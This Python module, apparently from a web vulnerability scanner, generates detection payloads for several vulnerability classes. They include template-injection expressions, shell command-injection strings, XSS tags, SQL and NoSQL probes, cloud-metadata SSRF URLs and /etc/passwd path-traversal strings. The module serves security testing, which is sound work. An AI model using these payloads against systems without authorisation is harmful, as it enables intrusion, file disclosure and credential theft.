"""Injection payloads by vulnerability class.

Each generator takes a :class:`~core.injection.markers.Marker` (and, for blind
classes, an OAST callback host from :mod:`core.oast`) and returns payloads whose
*effect* is observable by a matching oracle in :mod:`core.injection.oracles` —
never an LLM judgement. Payloads are non-destructive: they read/echo/resolve,
they don't drop tables or delete files.
"""

from __future__ import annotations

from typing import List, Tuple

from core.injection.markers import Marker
from core.oast import payloads as _oast


# ─────────────────────────── SSTI ───────────────────────────

def ssti(marker: Marker) -> List[Tuple[str, str]]:
    """(payload, expected-substring) pairs across template engines.

    Expected is the marker-wrapped *product* — its presence proves evaluation.
    """
    p = marker.product
    a, b = marker.a, marker.b
    expected = marker.wrap(str(p))
    t = marker.token
    return [
        (f"{t}{{{{{a}*{b}}}}}{t}", expected),          # Jinja2 / Twig / Nunjucks
        (f"{t}${{{a}*{b}}}{t}", expected),             # FreeMarker / JSP EL / Thymeleaf
        (f"{t}#{{{a}*{b}}}{t}", expected),             # Ruby ERB-ish / some EL
        (f"{t}<%= {a}*{b} %>{t}", expected),           # ERB
        (f"{t}@({a}*{b}){t}", expected),               # Razor
        (f"{t}{{{a}*{b}}}{t}", expected),              # Smarty-ish
    ]


# ─────────────────────────── Command injection ───────────────────────────

def cmdi(marker: Marker) -> List[Tuple[str, str]]:
    """(payload, expected) — a *computed* echo proves command EXECUTION.

    The marker echoes ``$((a*b))`` (shell arithmetic), so the expected string is
    the token-wrapped product. A vulnerable target evaluates the arithmetic and
    returns the product; an app that merely *reflects* the input echoes the
    literal ``$((a*b))`` and does NOT match — the same reflection-proof trick SSTI
    uses. (A bare echoed token would false-positive on any reflecting endpoint.)
    """
    a, b, tok = marker.a, marker.b, marker.token
    expected = marker.wrap(str(marker.product))
    return [
        (f"; echo {tok}$(({a}*{b})){tok}", expected),
        (f"| echo {tok}$(({a}*{b})){tok}", expected),
        (f"& echo {tok}$(({a}*{b})){tok}", expected),
        (f"`echo {tok}$(({a}*{b})){tok}`", expected),
        (f"$(echo {tok}$(({a}*{b})){tok})", expected),
        (f"%0aecho {tok}$(({a}*{b})){tok}", expected),   # newline injection
    ]


def cmdi_blind(host: str) -> List[str]:
    """Blind command injection: force an out-of-band lookup (OAST-confirmed)."""
    return _oast.rce_commands(host)


# ─────────────────────────── Reflected XSS ───────────────────────────

def xss(marker: Marker) -> List[Tuple[str, str]]:
    """(payload, expected-unescaped-substring) reflected-XSS pairs.

    The marker token sits *inside* the injected tag, so ``expected`` is a raw,
    unescaped HTML fragment. The oracle only fires when that exact fragment
    appears verbatim in the response — an app that HTML-encodes the input turns
    ``<`` into ``&lt;`` and the fragment won't match, so a *safely reflected*
    value is never flagged. Presence of the raw tag means the browser would parse
    it (and run the ``onerror``/``onload``), i.e. reflected XSS.
    """
    tok = marker.token
    return [
        # attribute breakout (double / single quote) then a new tag
        (f'{tok}"><img src=x onerror="{tok}">', f'"><img src=x onerror="{tok}">'),
        (f"{tok}'><img src=x onerror='{tok}'>", f"'><img src=x onerror='{tok}'>"),
        # HTML body context
        (f'<img src=x onerror="{tok}">', f'<img src=x onerror="{tok}">'),
        (f'<svg onload="{tok}">', f'<svg onload="{tok}">'),
        # script-tag context breakout
        (f'</script><script>{tok}</script>', f'<script>{tok}</script>'),
    ]


# ─────────────────────────── SQL injection ───────────────────────────

def sqli_error() -> List[str]:
    """Payloads that provoke a database error (error-signature oracle)."""
    return ["'", '"', "')", "';", "' OR '1'='1", "\\", "1'\"`"]


def sqli_boolean() -> List[Tuple[str, str]]:
    """(true-payload, false-payload) pairs for the boolean-diff oracle.

    A vulnerable param makes the true variant behave like the baseline and the
    false variant differ — that asymmetry is the proof.
    """
    return [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' OR '1'='1", "' AND '1'='2"),
        (" AND 1=1", " AND 1=2"),
        ("') AND ('1'='1", "') AND ('1'='2"),
    ]


def sqli_oob(host: str) -> List[str]:
    """Out-of-band SQLi (blind, OAST-confirmed)."""
    return list(_oast.sqli_oob(host).values())


# ─────────────────────────── NoSQL ───────────────────────────

def nosqli_boolean() -> List[Tuple[str, str]]:
    """(true, false) NoSQL-injection pairs for the boolean-diff oracle.

    These are **value-context** payloads that fire when concatenated into a
    server-side JS/where clause — the form that works when the payload is sent as
    a parameter *value*. Operator-key injection (``param[$ne]=x``) needs the
    operator encoded in the parameter *key*, which the value-based injection
    point here can't express, so those variants are omitted rather than shipped
    inert (they would be a false sense of coverage).
    """
    return [
        ("'||'1'=='1", "'&&'1'=='2"),
        ('"||"1"=="1', '"&&"1"=="2'),
        ("' || true || '", "' && false && '"),
    ]


# ─────────────────────────── SSRF / XXE (blind, OAST) ───────────────────────────

def ssrf(host: str) -> List[str]:
    return _oast.ssrf_urls(host)


def ssrf_metadata() -> List[str]:
    """Cloud metadata SSRF targets (in-band confirmation via response content)."""
    return [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",     # DigitalOcean
    ]


def xxe(host: str) -> str:
    return _oast.xxe(host)


# ─────────────────────────── Path traversal ───────────────────────────

def path_traversal() -> List[Tuple[str, str]]:
    """(payload, expected-substring) — leaked file content is the proof."""
    return [
        ("../../../../../../etc/passwd", "root:"),
        ("..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "root:"),
        ("....//....//....//etc/passwd", "root:"),
        ("../../../../windows/win.ini", "[extensions]"),
    ]


__all__ = [
    "ssti", "cmdi", "cmdi_blind", "sqli_error", "sqli_boolean", "sqli_oob",
    "nosqli_boolean", "ssrf", "ssrf_metadata", "xxe", "path_traversal",
]
